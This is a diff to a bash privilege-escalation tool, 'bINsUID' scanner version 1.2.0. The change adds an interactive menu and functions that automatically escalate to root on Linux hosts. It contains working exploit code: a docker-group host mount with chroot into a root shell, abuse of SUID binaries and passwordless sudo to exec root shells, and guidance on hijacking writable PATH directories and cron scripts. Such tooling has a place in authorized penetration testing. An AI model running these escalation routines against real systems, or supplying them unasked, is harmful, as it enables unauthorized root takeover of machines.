@@ -1,15 +1,17 @@
 #!/usr/bin/env bash
 # bINsUID bash scanner — privesc recon and auto-exploit without Python.
-# Usage: binsuid-scan.sh [--quick] [--auto] [-y] [--dry-run] [--silent] [--no-color] [--debug]
-VERSION="1.1.9"
+# Usage: binsuid-scan.sh [--quick] [--auto|-i] [-y] [--dry-run] ...
+VERSION="1.2.0"
 
 QUICK=0
 SILENT=0
 NO_COLOR=0
 DEBUG=0
 AUTO=0
+INTERACTIVE=0
 ASSUME_YES=0
 DRY_RUN=0
+LAUNCH_SHELL=0
 
 for arg in "$@"; do
   case "$arg" in
@@ -18,7 +20,8 @@ for arg in "$@"; do
     --no-color) NO_COLOR=1 ;;
     --debug) DEBUG=1 ;;
     --auto) AUTO=1 ;;
-    -y|--yes) ASSUME_YES=1 ;;
+    --interactive|-i) INTERACTIVE=1 ;;
+    -y|--yes) ASSUME_YES=1; LAUNCH_SHELL=1 ;;
     --dry-run) DRY_RUN=1; AUTO=1 ;;
     --scan-only|--version|-V|-h|--help) ;;
     --json)
@@ -36,12 +39,13 @@ for arg in "$@"; do
     -V|--version) echo "binsuid-scan $VERSION (bash mode)"; exit 0 ;;
     -h|--help)
       echo "binsuid-scan $VERSION — bash privesc recon + auto-exploit"
-      echo "  --quick  --auto  -y  --dry-run  --silent  --no-color  --debug"
+      echo "  --quick  --auto  --interactive|-i  -y  --dry-run  --silent  --no-color"
       echo ""
       echo "Examples:"
       echo "  binsuid-scan.sh --quick              # recon only"
-      echo "  binsuid-scan.sh --auto -y            # scan then auto-escalate"
-      echo "  binsuid-scan.sh --auto --dry-run -y  # show exploit commands"
+      echo "  binsuid-scan.sh --auto -y            # auto: best vector first"
+      echo "  binsuid-scan.sh --interactive        # menu: pick vector (1,2,3…)"
+      echo "  binsuid-scan.sh -i -y                # menu then launch shell on success"
       exit 0
       ;;
     *) echo "Unknown option: $arg" >&2; exit 2 ;;
@@ -258,6 +262,11 @@ member_of_group() {
   id -Gn 2>/dev/null | tr '[:upper:]' '[:lower:]' | grep -qw "$g"
 }
 
+should_launch_shell() {
+  { [ "$ASSUME_YES" -eq 1 ] || [ "$LAUNCH_SHELL" -eq 1 ]; } \
+    && [ -t 0 ] && [ -t 1 ]
+}
+
 try_docker_group() {
   member_of_group docker || return 1
   command -v docker >/dev/null 2>&1 || return 1
@@ -273,7 +282,7 @@ try_docker_group() {
   uid="$(docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u' 2>/dev/null)" || return 1
   [ "$uid" = "0" ] || return 1
   p "${GREEN}[+] SUCCESS — root via docker group (host at /mnt in container)${RESET}"
-  if [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ]; then
+  if should_launch_shell; then
     p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
     exec $cmd
   fi
@@ -309,7 +318,7 @@ try_suid_binary() {
       ;;
   esac
   p "${GREEN}[+] SUCCESS — SUID $name${RESET}"
-  if [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ]; then
+  if should_launch_shell; then
     p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
     eval "exec $cmd"
   fi
@@ -328,7 +337,7 @@ try_sudo_nopasswd() {
   fi
   sudo -n /bin/sh -c 'id -u' 2>/dev/null | grep -q '^0$' || return 1
   p "${GREEN}[+] SUCCESS — NOPASSWD sudo${RESET}"
-  [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ] && exec $cmd
+  should_launch_shell && exec $cmd
   p "${CYAN}[*] Run:${RESET} $cmd"
   return 0
 }
@@ -349,6 +358,176 @@ auto_escalate() {
   try_sudo_nopasswd && return 0
   p "${RED}[-] No automatic escalation succeeded.${RESET}"
   return 1
+}
+
+exploit_binaries() {
+  p ""
+  p "${CYAN}${BOLD}>>> SUID / SGID${RESET}"
+  if [ -n "$SUID_PRIORITY" ]; then
+    local bin old_ifs
+    old_ifs="$IFS"
+    IFS=$'\n'
+    for bin in $SUID_PRIORITY; do
+      [ -n "$bin" ] && try_suid_binary "$bin" && { IFS="$old_ifs"; return 0; }
+    done
+    IFS="$old_ifs"
+    p "${YELLOW}[-] No auto SUID payload worked for listed binaries.${RESET}"
+  else
+    p "${DIM}  No custom SUID targets.${RESET}"
+  fi
+  if [ -n "$SGID_FOUND" ]; then
+    p "${YELLOW}[!] SGID binaries (manual / GTFOBins):${RESET}"
+    echo "$SGID_FOUND" | while IFS= read -r s; do
+      [ -n "$s" ] && p "  $s"
+    done
+  fi
+  return 1
+}
+
+exploit_path() {
+  p ""
+  p "${CYAN}${BOLD}>>> Writable PATH${RESET}"
+  [ -n "$PATH_FOUND" ] || { p "${DIM}  No writable PATH entries.${RESET}"; return 1; }
+  echo "$PATH_FOUND" | while IFS= read -r line; do
+    [ -n "$line" ] && p "  ${YELLOW}[PATH]${RESET} $line"
+  done
+  p ""
+  p "${DIM}  Hijack: place a fake binary in a writable PATH dir before cron/service runs.${RESET}"
+  p "${DIM}  Example: echo '#!/bin/sh' > /path/writable/cmd && chmod +x /path/writable/cmd${RESET}"
+  if [ -n "$CRON_FOUND" ]; then
+    p ""
+    p "${YELLOW}[!] Writable cron scripts:${RESET}"
+    echo "$CRON_FOUND" | while IFS= read -r c; do
+      [ -n "$c" ] && p "  $c"
+    done
+  fi
+  return 1
+}
+
+exploit_groups() {
+  p ""
+  p "${CYAN}${BOLD}>>> Privileged groups${RESET}"
+  member_of_group docker && try_docker_group && return 0
+  if [ -n "$GROUP_FOUND" ]; then
+    p "${YELLOW}[!] Manual steps for other groups:${RESET}"
+    echo "$GROUP_FOUND" | while IFS= read -r g; do
+      [ -n "$g" ] && p "  ${GREEN}[GROUP]${RESET} $g"
+    done
+  fi
+  return 1
+}
+
+exploit_sudo() {
+  p ""
+  p "${CYAN}${BOLD}>>> Sudo${RESET}"
+  try_sudo_nopasswd && return 0
+  if [ -n "$SUDO_OUT" ]; then
+    p "${YELLOW}[!] Sudo rules (no NOPASSWD ALL auto payload):${RESET}"
+    echo "$SUDO_OUT" | while IFS= read -r s; do
+      [ -n "$s" ] && p "  $s"
+    done
+  else
+    p "${DIM}  No passwordless sudo rules.${RESET}"
+  fi
+  return 1
+}
+
+exploit_capabilities() {
+  p ""
+  p "${CYAN}${BOLD}>>> Capabilities${RESET}"
+  [ -n "$CAP_FOUND" ] || { p "${DIM}  No dangerous capabilities found.${RESET}"; return 1; }
+  echo "$CAP_FOUND" | while IFS= read -r c; do
+    [ -n "$c" ] && p "  ${MAGENTA}[CAPS]${RESET} $c"
+  done
+  p "${DIM}  Install python3 + binsuid for automatic cap abuse.${RESET}"
+  return 1
+}
+
+exploit_cron() {
+  p ""
+  p "${CYAN}${BOLD}>>> Writable cron${RESET}"
+  [ -n "$CRON_FOUND" ] || { p "${DIM}  No writable cron scripts.${RESET}"; return 1; }
+  echo "$CRON_FOUND" | while IFS= read -r c; do
+    [ -n "$c" ] && p "  ${YELLOW}[CRON]${RESET} $c"
+  done
+  p "${DIM}  Edit script before next cron run to execute your payload.${RESET}"
+  return 1
+}
+
+interactive_menu() {
+  local max=0
+  local menu_bin=0 menu_path=0 menu_group=0 menu_sudo=0 menu_caps=0 menu_cron=0
+
+  p ""
+  p "${CYAN}${BOLD}>>> Escalation menu${RESET}"
+  p "${DIM}  Pick a vector, or ${BOLD}a${RESET}${DIM} for automatic (best first).${RESET}"
+
+  if [ -n "$SUID_PRIORITY" ] || [ -n "$SGID_FOUND" ]; then
+    max=$((max + 1)); menu_bin=$max
+    p "  ${BOLD}$max${RESET}) SUID / SGID binaries  ${DIM}($(count_lines "$SUID_PRIORITY") SUID, $(count_lines "$SGID_FOUND") SGID)${RESET}"
+  fi
+  if [ -n "$PATH_FOUND" ]; then
+    max=$((max + 1)); menu_path=$max
+    p "  ${BOLD}$max${RESET}) Writable PATH  ${DIM}($(count_lines "$PATH_FOUND") dirs)${RESET}"
+  fi
+  if [ -n "$GROUP_FOUND" ]; then
+    max=$((max + 1)); menu_group=$max
+    p "  ${BOLD}$max${RESET}) Privileged groups  ${DIM}(docker, lxd…)${RESET}"
+  fi
+  if [ -n "$SUDO_OUT" ]; then
+    max=$((max + 1)); menu_sudo=$max
+    p "  ${BOLD}$max${RESET}) Sudo rules"
+  fi
+  if [ -n "$CAP_FOUND" ]; then
+    max=$((max + 1)); menu_caps=$max
+    p "  ${BOLD}$max${RESET}) Capabilities"
+  fi
+  if [ -n "$CRON_FOUND" ]; then
+    max=$((max + 1)); menu_cron=$max
+    p "  ${BOLD}$max${RESET}) Writable cron scripts"
+  fi
+
+  p "  ${BOLD}a${RESET}) Auto — try best vector first"
+  p "  ${BOLD}q${RESET}) Quit (recon only)"
+
+  if [ "$max" -eq 0 ]; then
+    p "${YELLOW}[-] No escalation targets to choose.${RESET}"
+    return 1
+  fi
+
+  while true; do
+    if [ -t 0 ]; then
+      printf "${CYAN}Select [1-%s / a / q]: ${RESET}" "$max"
+      IFS= read -r choice || choice="q"
+    else
+      p "${YELLOW}[-] No TTY — use --auto -y for non-interactive escalation.${RESET}"
+      return 1
+    fi
+
+    case "$choice" in
+      q|Q) return 1 ;;
+      a|A)
+        LAUNCH_SHELL=1
+        auto_escalate
+        return $?
+        ;;
+    esac
+
+    if [ "$menu_bin" -gt 0 ] && [ "$choice" = "$menu_bin" ]; then
+      LAUNCH_SHELL=1; exploit_binaries; return $?; fi
+    if [ "$menu_path" -gt 0 ] && [ "$choice" = "$menu_path" ]; then
+      exploit_path; return 1; fi
+    if [ "$menu_group" -gt 0 ] && [ "$choice" = "$menu_group" ]; then
+      LAUNCH_SHELL=1; exploit_groups; return $?; fi
+    if [ "$menu_sudo" -gt 0 ] && [ "$choice" = "$menu_sudo" ]; then
+      LAUNCH_SHELL=1; exploit_sudo; return $?; fi
+    if [ "$menu_caps" -gt 0 ] && [ "$choice" = "$menu_caps" ]; then
+      exploit_capabilities; return 1; fi
+    if [ "$menu_cron" -gt 0 ] && [ "$choice" = "$menu_cron" ]; then
+      exploit_cron; return 1; fi
+
+    p "${RED}  Invalid choice. Enter 1-$max, a, or q.${RESET}"
+  done
 }
 
 # --- run scans ---
@@ -374,9 +553,11 @@ p "${CYAN}==============================================${RESET}"
 p "${BOLD}  bINsUID scan (bash ${CYAN}$VERSION${RESET}${BOLD})${RESET}"
 p "${CYAN}==============================================${RESET}"
 if [ "$AUTO" -eq 1 ]; then
-  p "${DIM}  Auto-exploit mode — tries best vector after scan.${RESET}"
+  p "${DIM}  Auto-exploit — tries best vector after scan.${RESET}"
+elif [ "$INTERACTIVE" -eq 1 ]; then
+  p "${DIM}  Interactive — pick a vector from the menu after scan.${RESET}"
 else
-  p "${DIM}  Recon only — add --auto -y to escalate.${RESET}"
+  p "${DIM}  Recon only — add ${BOLD}--auto -y${RESET}${DIM} or ${BOLD}--interactive${RESET}${DIM}.${RESET}"
 fi
 p ""
 
@@ -458,6 +639,11 @@ fi
 
 if [ "$AUTO" -eq 1 ]; then
   auto_escalate
+  exit $?
+fi
+
+if [ "$INTERACTIVE" -eq 1 ]; then
+  interactive_menu
   exit $?
 fi
 
